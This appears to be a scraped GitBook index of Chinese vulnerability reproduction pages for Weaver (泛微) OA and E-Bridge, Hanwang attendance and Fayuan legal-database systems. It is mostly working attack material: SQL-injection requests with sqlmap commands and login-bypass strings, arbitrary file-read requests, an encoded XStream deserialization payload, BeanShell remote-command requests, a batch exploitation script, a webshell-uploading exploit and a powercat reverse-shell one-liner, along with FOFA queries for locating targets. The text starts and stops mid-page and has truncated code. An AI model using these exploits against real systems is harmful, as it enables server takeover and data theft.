/JusRepos/ui/login.aspx HTTP/1.1 Host: xxx.xxx.xxx.xxxx Content-Length: 362 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: ASP.NET_SessionId=0upclbweiokwx4qnkpfzumir x-forwarded-for: 127.0.0.1 x-originating-ip: 127.0.0.1 x-remote-ip: 127.0.0.1 x-remote-addr: 127.0.0.1 Connection: close __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwULLTE4NTUyMzg5NDNkZBLjR6E85W4xvkheqS5g7gOsMdeop3Xfh1BwnTSCbV7z&__VIEWSTATEGENERATOR=E3BBEDB7&__EVENTVALIDATION=%2FwEdAATFHpXckaPEvZEyN%2BNhIQGTDFTzKcXJqLg%2BOeJ6QAEa2jPSlu16Yx4QbiDU%2BdddK1MwoKxxc3z27YmfD4jI4gVsV9%2FpN02jZyPKj4JeL7G5UVenPtL%2FK1en7XvhZG5vyHk%3D&txtUser=admin&txtPwd=123&btnSub=%E7%99%BB%E5%BD%95 其中注入的参数为 POST数据中的 txtUser 参数, 保存为文件使用 Sqlmap跑一下 sqlmap -r sql.txt -p txtUser 同时还存在着万能密码可以直接登录后台 user: 1' or 1=1 -- pass: peiqi Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:14:21 "},"Web安全/杭州法源/杭州法源软件 法律知识数据库系统 后台XSS漏洞/杭州法源软件 法律知识数据库系统 后台XSS漏洞.html":{"url":"Web安全/杭州法源/杭州法源软件 法律知识数据库系统 后台XSS漏洞/杭州法源软件 法律知识数据库系统 后台XSS漏洞.html","title":"杭州法源软件 法律知识数据库系统 后台XSS漏洞","keywords":"","body":"杭州法源软件 法律知识数据库系统 后台XSS漏洞 漏洞描述 杭州法源软件开发有限公司开发的实践教学平台系统下的法律知识数据库系统登录后台用户名处存在通用XSS漏洞 漏洞影响 [!NOTE] 杭州法源软件 法律知识数据库系统 FOFA [!NOTE] icon_hash=\"2018105215\" || title=\"实践教学平台 - 杭州法源软件开发有限公司\" 漏洞复现 登录后台后更改用户名，使用 td标签 闭合 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:14:22 "},"Web安全/汉王人脸考勤管理系统/汉王人脸考勤管理系统 Check SQL注入漏洞/汉王人脸考勤管理系统 Check SQL注入漏洞.html":{"url":"Web安全/汉王人脸考勤管理系统/汉王人脸考勤管理系统 Check SQL注入漏洞/汉王人脸考勤管理系统 Check SQL注入漏洞.html","title":"汉王人脸考勤管理系统 Check SQL注入漏洞","keywords":"","body":"汉王人脸考勤管理系统 Check SQL注入漏洞 漏洞描述 汉王人脸考勤管理系统存在SQL注入漏洞，攻击者可利用该漏洞获取数据库敏感信息。 漏洞影响 汉王人脸考勤管理系统 FOFA title=\"\"汉王人脸考勤管理系统\"\" 漏洞复现 登录界面如下 请求包如下 POST /Login/Check HTTP/1.1 Host: x.x.x.x Content-Length: 27 Accept: */* X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Origin: http://x.x.x.x:8088 Referer: http://x.x.x.x:8088/Login/Index Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: ASP.NET_SessionId=otvxgfy0csmrw4i5y5t24oo1 Connection: close strName=admin&strPwd=123456 其中strName参数存在注入 sqlmap -r postwang.txt -p strName --current-user user: admin' or 1=1-- pass: admin 万能密码绕过登录 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:14:25 "},"Web安全/泛微oa/泛微 E-Bridge 云桥任意文件读取/泛微 E-Bridge 云桥任意文件读取.html":{"url":"Web安全/泛微oa/泛微 E-Bridge 云桥任意文件读取/泛微 E-Bridge 云桥任意文件读取.html","title":"泛微 E-Bridge 云桥任意文件读取","keywords":"","body":"泛微 E-Bridge 云桥任意文件读取 一、漏洞简介 泛微云桥（E-Bridge）是上海泛微公司在\"互联网+\"的背景下研发的一款用于桥接互联网开放资源与企业信息化系统的系统集成中间件。泛微云桥存在任意文件读取漏洞，攻击者成功利用该漏洞，可实现任意文件读取，获取敏感信息。 二、漏洞影响 2018-2019 多个版本。 三、复现过程 服务器Linux： GET /wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt HTTP/1.1 Host: www.0-sec.org:8088 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: ecology_JSessionId=abc3I_8E3ZP75a_tnGnrx; testBanCookie=test; JSESSIONID=3kqlxwz8wo04x6cs4dlaovn; EBRIDGE_JSESSIONID=3DD7A4B45D85CAE1AC75F8FF6DEB7556 Connection: close windows服务器： GET /wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C://windows/win.ini&fileExt=txt HTTP/1.1 Host: www.0-sec.org Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: EBRIDGE_JSESSIONID=182ED2E3025C11EA9ADDC07761F56DBA Connection: close 读取文件 GET /file/fileNoLogin/35acd348e86549ffb33d7f531350391e HTTP/1.1 Host: www.0-sec.org:8088 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: EBRIDGE_JSESSIONID=BABB53753778ED19791B6F606E5B0D77 Connection: close 35acd348e86549ffb33d7f531350391e为上个包返回的id Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:14:27 "},"Web安全/泛微oa/泛微E-Cology WorkflowServiceXml RCE也叫xstream反序列化/泛微E-Cology WorkflowServiceXml RCE也叫xstream反序列化.html":{"url":"Web安全/泛微oa/泛微E-Cology WorkflowServiceXml RCE也叫xstream反序列化/泛微E-Cology WorkflowServiceXml RCE也叫xstream反序列化.html","title":"泛微E-Cology WorkflowServiceXml RCE也叫xstream反序列化","keywords":"","body":"泛微E-Cology WorkflowServiceXml RCE也叫xstream反序列化 漏洞描述 泛微E-cology OA系统的WorkflowServiceXml接口可被未授权访问，攻击者调用该接口，可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程代码执行 漏洞影响 E-cology FOFA app=\"泛微-协同办公OA\" 漏洞复现 漏洞分析请看宽字节安全团队： https://mp.weixin.qq.com/s/iTP9jBypsJEsSlAIaNOnhw Poc import base64 import requests import random import re import json import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning def POC_1(target_url): vuln_url = target_url + \"/services%20/WorkflowServiceXml\" cmd = \"net user\" headers = { 'User-Agent': 'Apache-HttpClient/4.1.1 (java 1.5)', 'SOAPAction': '\"\"', 'potats0': cmd, \"Content-Type\": \"text/xml;charset=UTF-8\" } data = ''' 2 3 text/plain 0 -1 0 $$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$d9W$TW$i$fe$G$C3$M$c3b$Qa$5c$b1u$J$w$c1$ee$V$a9$VA$5c$g$d0$g$8a$Vm$ed0$5c$60$m$cc$c4$c9D$90$$v$b3$9b$ddwk$b7$97$k_$db$3eDO$7b$da$d3$87$be$d8S$l$da$3f$a8$f6$bb$93$40$J$89$da$9c$93$7b$e7$fe$eeo$bb$bf$ef$bb$bf$99$3f$fe$f9$e9W$A$f7$e3$5b$j$G$S$3a$G0$a8$e1$88$9c$8f$eax$i$c7$e4$90$d40$a4$e3$J$Mk8$ae$e2I$j$3aN$a8$Y$d1q$S$a7$a4$d9SR$f2$b4$86$d3r$7eF$87$85Q9$d8$g$c6T$I$N$e3$3a$9a1$a1aR$85$a3aJ$c5$b4$8e$Uft$ac$81$ab$c1$93sZ$Og$e4$e0k$c8$a8$It$dc$8d$ac$8a$b3$K$aa$bb$j$d7$J$f6$u$a8$8c$b5$P$x$88$f4zcBAC$c2q$c5$60vfT$f8C$d6h$8a$92h$c2$b3$ad$d4$b0$e5$3br$bd$m$M$ect$c6$b3$a7E$40$fd$e9$de$945$3f$af$60Eb$ca$3aku$a6$yw$a2$93$a2Lf7$V$tD$d0$9b$f5$7d$e1$G$c7$c4$99$ac$c8$E$D$KV$_Q$f4$c5xJ$d8A$e7$80$I$s$bd1Z$d4$dbE$ea2$81$ff$b4$8f$8cNQ$99Z$ca$b8$C$b3$8c$9b$7eG$a4$a4$X$cd$X$99$b4$e7f$98$ab$ce$U$8e$fbN$m$7c$86Vf$V4$e6$ed$i$af3$_$de$9d$d79$u$ac$b1P$a7$d2$9e$Z$x$O$9b$M$7c$c7$9d$90a3$K$9a$f2$h$d9$c0Iu$sm$cbuC$P$K$p5$_1$d9$3fg$8bt$e0x$$$f7$o$c1$a4C$c3$9a$c4x$d6$9e$3e$e7e$v$aaK$G$96$3d$3d$60$a5$c3$82$S$Q$S$40$c5$y$e1W1Gt$J$v$f1$q$60$cc$z$e9e$7d$5b$f4$3b$b2$f0F$c1E$5cF2$b0$F$5bU$9c30$8fg$Z$868$d9$G$9e$c3$f3$w$5e0p$k$_$gx$J$_$x$d8j$7b3q$db$ca$da$93$5e$dc$V$c1$ac$e7O$c7SN$s$Qn$7c$c8N$t$XqT$f1$8a$81Wq$81P$96$c0Fj$yC$d7$c0kx$9d$d5$5c$8e$O$8fa$e0$N$bci$e0$z$5c4$f06$$$d2$f6$f4$C$k$fd$96$cd2$hx$H$ef$f2$a4$G$de$c3$fb$G$3e$c0$87$y$cf$oN$qA1B$KbioV$f8b$acm$f4$5c$5b$da$L$ac$m$e3$b5$95$fd$Z$f8$I$l$e7$9d$e5$B$z$ca0$P$a4$C5$efc$tOZ$C$a6$8aO$M$7c$8a$cfdu$3fWPq$aa$c7$c0$r$7ca$e02$be4$f0$V$beV$A$b2$a0$M$d4$G$be$c1V$3a$_$60$a4$a0$f5V$3cW$d0r$L$ee$$d$U$ee$i$cb$ba$813S$e0$f0$e2$a29$d6$9e$u$d1$914$Ts$c2$s$da$b1R$e6$$58$ea$7b$b6$I$_$e7$92$c2$MM$fa$ac$WyY$b8$7d$L$eb$95E$b1$f2RZ6K$7exn$m$e6$82$90$L$J$__j$b3H$7d$c9$96$b4$v$bbA$a8R$7c$I$r$K6$df$n$f7$85$b6$o$e1$5d$a8$e4$de26$tKl$dao$d7s$aa$j$f7$ac7$cd$d2$ee$8a$956$9b$93$a5$a2$f6r$zI$935$c9$l$a3$a9$b4$M$f2$ceS$n$99M$L$df$cek5r$dd$t$b8$m$af$L$d8w$dc$e1$fc$cb$db$5c$5dF$E$3d$b6$84$d3$J$fbr$q6$o$9by$r$3d$x$d8R$e60e3$af$9a$95$b7L$S$abL$f4$e1$oF$W$c8$c3$h$ca$Q$87$dct6$a0$9e$b0fH$e8$853$f3$d6$$$d9$a0$fb$d6X$d9$N$e9$d9$c8fD$9fH93$f9$5b$7e$h$ea$$k$b7$ea$a4$95$Z$q$fb$c2$d7$d7$I$P$ee$86$8bb$ba$$$b6$ed$864$l$82$b0$e5$O$f9$96$z$b0$R$9b$f9$82$95$3fvn$d9E9$c6$80$8avT$a3$96$d2$bf$b7$5d$85r$N$V$d1$ca$i$o$c7$af$a1$w$87$ea$a8$9a$83$96$d8$k$ad$a9$fc$Fz$O$b5$D$3b$U$3e$Z9$d4$Nv$e4P$9fCC$b41$87$V$5d$R3$S$c9$njF$um$ea$aa2i$5b$l$5dY0$ea$aa6$ab$cd$aa$82$ddoh$eeRM5$ba$w$87$W$e9$o$da$g$a1$d6$89$ca$a8$99$94$aa$9a$a9uP$60P$b0$3a$Z$aa$9b$5d5$3fc$cd$J$sf$d60$b1$i$d6$5e$c5$ba$e8$fa$i6t$e9$a6j2$40$db$r$d4$cay$e3$VTE$ef$a2$df$x2$e7$i6$fd$c0$TFp$j$7f$f2$D$a0$S$ed$3c$e3$m$9a8$g$94$d6$a3$O$N0$d1$88MX$818$a2$e8$e6$de$3e$ac$c4a$7ea$8c$60$V$a6$d0$823h$c5$Fj$5d$c2j$fc$c8$_$8a$ebXOokq$D$eb$f0$X6$60$h$bd$cd$d3$9f$89$ef$b1$j$3b$Yo$T$beC$H$fdU$f0$7f$Z$9d$d8$c9$c8$dd$ec$fc$f7$e0$5eF$3d$cc7$d4$7d$94U1$82$c7O$a58k$3f$85$d3x$A$PBe$a4$3e$3cD$99$c6x$3b$f10v$a1$86Q$5b$d0$85$dd$fc$g$baA$fbn$3c$c2$Y$c4$K$7b$f0$u$e7$bd$fc$3b$88$dc$c4$ef$a8U$d1$a3b$9f$8a$5e$V$7d$w$f6$87$p$9f$fb$c3$f1$80$8a$83P$b8$baI$fb$ff$a1Z$R$ae$O$dcd$a6$b4$ea$91$c3$a1$IM$P3$60$F$k$fb$X$9f$s$83$aa$ec$J$A$A false false false java. javax. sun. . KEYS 0 0 0 false 0 2 '''.format(cmd=cmd) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10) if \"powered by potatso\" in response.text and response.status_code == 500: print(\"\\033[36m[o] 存在漏洞 \\n[o] 响应为:\\n{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) exp: POST /services%20/WorkflowServiceXml HTTP/1.1 Accept-Encoding: gzip, deflate Content-Type: text/xml;charset=UTF-8 SOAPAction: \"\" Content-Length: 21168 Host: : 1.1.1.1 User-Agent: Apache-HttpClient/4.1.1 (java 1.5) Connection: close 2 outputProperties 3 Pwner yv66vgAAADIANwoADAAmBwAnCAAoCgACACkHACoKAAUAJggAKwoABQAsCgACAC0HAC4HAC8HADABAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAE0xSZXNpbi9Mb2dpbkZpbHRlcjsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAMQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAuAQAKU291cmNlRmlsZQEAEExvZ2luRmlsdGVyLmphdmEMAA0ADgEAGGphdmEvaW8vRmlsZU91dHB1dFN0cmVhbQEAH0Q6XFdFQVZFUlxlY29sb2d5XGNzc1xsb2dpbi5qc3AMAA0AMgEAFnN1bi9taXNjL0JBU0U2NERlY29kZXIBALhQQ1VnYm1WM0lHcGhkbUV1YVc4dVJtbHNaVTkxZEhCMWRGTjBjbVZoYlNoeVpYRjFaWE4wTG1kbGRGQmhjbUZ0WlhSbGNpZ2laaUlwS1M1M2NtbDBaU2h1WlhjZ2MzVnVMbTFwYzJNdVFrRlRSVFkwUkdWamIyUmxjaWdwTG1SbFkyOWtaVUoxWm1abGNpaHlaWEYxWlhOMExtZGxkRkJoY21GdFpYUmxjaWdpZENJcEtTazdKVDRLDAAzADQMADUANgEAE2phdmEvaW8vSU9FeGNlcHRpb24BABFSZXNpbi9Mb2dpbkZpbHRlcgEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAxkZWNvZGVCdWZmZXIBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAFd3JpdGUBAAUoW0IpVgAhAAsADAAAAAAABAABAA0ADgABAA8AAAAvAAEAAQAAAAUqtwABsQAAAAIAEAAAAAYAAQAAAAwAEQAAAAwAAQAAAAUAEgATAAAAAQAUABUAAgAPAAAAPwAAAAMAAAABsQAAAAIAEAAAAAYAAQAAABkAEQAAACAAAwAAAAEAEgATAAAAAAABABYAFwABAAAAAQAYABkAAgAaAAAABAABABsAAQAUABwAAgAPAAAASQAAAAQAAAABsQAAAAIAEAAAAAYAAQAAAB4AEQAAACoABAAAAAEAEgATAAAAAAABABYAFwABAAAAAQAdAB4AAgAAAAEAHwAgAAMAGgAAAAQAAQAbAAgAIQAOAAEADwAAAF4AAwABAAAAHbsAAlkSA7cABLsABVm3AAYSB7YACLYACacABEuxAAEAAAAYABsACgADABAAAAASAAQAAAAQABgAEwAbABIAHAAUABEAAAACAAAAIgAAAAcAAlsHACMAAAEAJAAAAAIAJQ== -1 0 false 2 通过xstream反序列化漏洞login.jsp 再去写入jsp马 \"); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\"\"); } %> Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:14:28 "},"Web安全/泛微oa/泛微OA  =9.0 sql注入漏洞/泛微OA  =9.0 sql注入漏洞.html":{"url":"Web安全/泛微oa/泛微OA  =9.0 sql注入漏洞/泛微OA  =9.0 sql注入漏洞.html","title":"泛微OA  =9.0 sql注入漏洞","keywords":"","body":"泛微OA \\ 一、漏洞简介 二、漏洞影响 泛微OA \\ 三、复现过程 GET //js/hrm/getdata.jsp?cmd=getSelectAllid&sql=select%20password%20as%20id%20from%20HrmResourceManager HTTP/1.1 Host: www.0-sec.org Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: Connection: close Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:14:28 "},"Web安全/泛微oa/泛微OA E-cology =9.0 远程代码执行漏洞/泛微OA E-cology =9.0 远程代码执行漏洞.html":{"url":"Web安全/泛微oa/泛微OA E-cology =9.0 远程代码执行漏洞/泛微OA E-cology =9.0 远程代码执行漏洞.html","title":"泛微OA E-cology =9.0 远程代码执行漏洞","keywords":"","body":"泛微OA E-cology \\ 一、漏洞简介 2019年9月17日泛微OA官方更新了一个远程代码执行漏洞补丁, 泛微e-cology OA系统的Java Beanshell接口可被未授权访问, 攻击者调用该Beanshell接口, 可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行, 漏洞等级严重. 二、漏洞影响 e-cology \\ 三、复现过程 漏洞指纹 Set-Cookie: ecology_JSessionId= ecology /weaver/bsh.servlet.BshServlet 漏洞复现 POST /weaver/bsh.servlet.BshServlet HTTP/1.1 Host: www.0-sec.org:8088 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Length: 98 Content-Type: application/x-www-form-urlencoded bsh.script=eval%00(\"ex\"%2b\"ec(\\\"whoami\\\")\");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw 利用技巧 1.其他形式绕过 eval%00(\"ex\"%2b\"ec(\\\"whoami\\\")\"); 也可以换成 ex\\u0065c(\"cmd /c dir\"); 2.泛微多数都是windows环境, 反弹shell可以使用pcat powershell IEX(New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c ip -p 6666 -e cmd poc useage #1.install python Dependencies Library pip install requests #2.批量脚本 执行 python Weaver-Ecology-OA_RCE-exp.py url.txt文件中 是url地址 需要带http协议 #/usr/bin/python #coding:utf-8 #Author:Ja0k #For Weaver-Ecology-OA_RCE import urllib3 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) import requests,sys headers = { 'Content-Type': 'text/xml; charset=utf-8', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0', 'Cache-Control': 'max-age=0', 'Content-Type': 'application/x-www-form-urlencoded', 'Upgrade-Insecure-Requests': '1', 'Content-Length': '578' } proxies= {'http':'http://127.0.0.1:8080'} def Poc_check(target): Url_Payload1=\"/bsh.servlet.BshServlet\" Url_Payload2=\"/weaver/bsh.servlet.BshServlet\" Url_Payload3=\"/weaveroa/bsh.servlet.BshServlet\" Url_Payload4=\"/oa/bsh.servlet.BshServlet\" Data_Payload1=\"\"\"bsh.script=exec(\"whoami\");&bsh.servlet.output=raw\"\"\" Data_Payload2= \"\"\"bsh.script=\\u0065\\u0078\\u0065\\u0063(\"whoami\");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw\"\"\" Data_Payload3= \"\"\"bsh.script=eval%00(\"ex\"%2b\"ec(bsh.httpServletRequest.getParameter(\\\\\"command\\\\\"))\");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw&command=whoami\"\"\" for Url_Payload in (Url_Payload1,Url_Payload2,Url_Payload3,Url_Payload4): url= target + Url_Payload for Data_payload in (Data_Payload1,Data_Payload2,Data_Payload3): try: http_response = requests.post(url,data=Data_payload,headers=headers,verify=False) #print http_response.status_code if http_response.status_code == 200: if \";\" not in (http_response.content): if \"Login.jsp\" not in (http_response.content): if \"Error\" not in (http_response.content): print \"{0} is a E-cologyOA_RCE Vulnerability\".format(url) print \"Server Current Username：{0}\".format(http_response.content) elif http_response.status_code == 500: print \"{0}500 maybe is Weaver-EcologyOA，Please confirm by yourself \".format(url) else: pass except Exception,Error: pass if __name__ == '__main__': for line in open(sys.argv[1]).readlines(): target=line.strip() Poc_check(target) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:14:29 "},"Web安全/泛微oa/泛微OA V8 SQL注入漏洞/泛微OA V8 SQL注入漏洞.html":{"url":"Web安全/泛微oa/泛微OA V8 SQL注入漏洞/泛微OA V8 SQL注入漏洞.html","title":"泛微OA V8 SQL注入漏洞","keywords":"","body":"泛微OA V8 SQL注入漏洞 漏洞描述 泛微OA V8 存在SQL注入漏洞，攻击者可以通过漏洞获取管理员权限和服务器权限 漏洞影响 [!NOTE] 泛微OA V8 FOFA [!NOTE] app=\"泛微-协同办公OA\" 漏洞复现 在getdata.jsp中，直接将request对象交给 weaver.hrm.common.AjaxManager.getData(HttpServletRequest, ServletContext) : 方法处理 在getData方法中，判断请求里cmd参数是否为空，如果不为空，调用proc方法 Proc方法4个参数，(“空字符串”,”cmd参数值”,request对象，serverContext对象) 在proc方法中，对cmd参数值进行判断，当cmd值等于getSelectAllId时，再从请求中获取sql和type两个参数值，并将参数传递进getSelectAllIds（sql,type）方法中 根据以上代码流程，只要构造请求参数 ?cmd= getSelectAllId&sql=select password as id from userinfo; 即可完成对数据库操控 POC http://xxx.xxx.xxx.xxx/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager 查询HrmResourceManager表中的password字段，页面中返回了数据库第一条记录的值（sysadmin用户的password） 解密后即可登录系统 Goby & POC [!NOTE] 已上传 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC 目录中 Weaver OA 8 SQL injection Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:14:29 "},"Web安全/泛微oa/泛微OA V9 任意文件上传/泛微OA V9 任意文件上传.html":{"url":"Web安全/泛微oa/泛微OA V9 任意文件上传/泛微OA V9 任意文件上传.html","title":"泛微OA V9 任意文件上传","keywords":"","body":"泛微OA V9 任意文件上传 漏洞描述 泛微OA V9 存在文件上传接口导致任意文件上传 漏洞影响 [!NOTE] 泛微OA V9 漏洞复现 漏洞位于: /page/exportImport/uploadOperation.jsp文件中 Jsp流程大概是:判断请求是否是multipart请求,然就没有了,直接上传了,啊哈哈哈哈哈 重点关注File file=new File(savepath+filename), Filename参数,是前台可控的,并且没有做任何过滤限制 利用非常简单,只要对着 127.0.0.1/page/exportImport/uploadOperation.jsp 来一个multipartRequest就可以,利用简单,自评高危!! 然后请求 然后请求路径: page/exportImport/fileTransfer/1.jsp Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:14:31 "},"Web安全/泛微oa/泛微OA weaver.common.Ctrl 任意文件上传漏洞/泛微OA weaver.common.Ctrl 任意文件上传漏洞.html":{"url":"Web安全/泛微oa/泛微OA weaver.common.Ctrl 任意文件上传漏洞/泛微OA weaver.common.Ctrl 任意文件上传漏洞.html","title":"泛微OA weaver.common.Ctrl 任意文件上传漏洞","keywords":"","body":"泛微OA weaver.common.Ctrl 任意文件上传漏洞 漏洞描述 泛微OA weaver.common.Ctrl 存在任意文件上传漏洞，攻击者通过漏洞可以上传webshell文件控制服务器 漏洞影响 泛微OA FOFA FOFA: app=\"泛微-协同办公OA\" 漏洞复现 存在漏洞的路径为： /weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp POC import zipfile import random import sys import requests def generate_random_str(randomlength=16): random_str = '' base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789' length = len(base_str) - 1 for i in range(randomlength): random_str += base_str[random.randint(0, length)] return random_str mm = generate_random_str(8) webshell_name1 = mm+'.jsp' webshell_name2 = '../../../'+webshell_name1 def file_zip(): shell = \"\"\" \"); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\"\"); } %> \"\"\" ## 替换shell内容 zf = zipfile.ZipFile(mm+'.zip', mode='w', compression=zipfile.ZIP_DEFLATED) zf.writestr(webshell_name2, shell) def GetShell(urllist): file_zip() print('上传文件中') urls = urllist + '/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp' file = [('file1', (mm+'.zip', open(mm + '.zip', 'rb'), 'application/zip'))] requests.post(url=urls,files=file,timeout=60, verify=False) GetShellurl = urllist+'/cloudstore/'+webshell_name1 GetShelllist = requests.get(url = GetShellurl) if GetShelllist.status_code == 200: print('利用成功webshell地址为:'+GetShellurl) else: print('未找到webshell利用失败') def main(): if (len(sys.argv) == 2): url = sys.argv[1] GetShell(url) else: print(\"python3 poc.py http://xx.xx.xx.xx\") if __name__ == '__main__': main() Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:14:32 "},"Web安全/泛微oa/泛微OA 数据库配置文件读取/泛微OA 数据库配置文件读取.html":{"url":"Web安全/泛微oa/泛微OA 数据库配置文件读取/泛微OA 数据库配置文件读取.html","title":"泛微OA 数据库配置文件读取","keywords":"","body":"泛微OA 数据库配置文件读取 一、漏洞简介 二、漏洞影响 三、复现过程 https://download.0-sec.org/Web安全/泛微OA/ecologyExp.jar-master.zip 使用方式： jdk 1.8以上，没混淆可以直接看源码 使用方法： java -jar ecologyExp.jar http://0-sec.org 源代码如下，编译好的在上方github链接里。 package com.test; import org.apache.http.HttpEntity; import org.apache.http.client.methods.CloseableHttpResponse; import org.apache.http.client.methods.HttpGet; import org.apache.http.impl.client.CloseableHttpClient; import org.apache.http.impl.client.HttpClientBuilder; import org.apache.http.util.EntityUtils; import 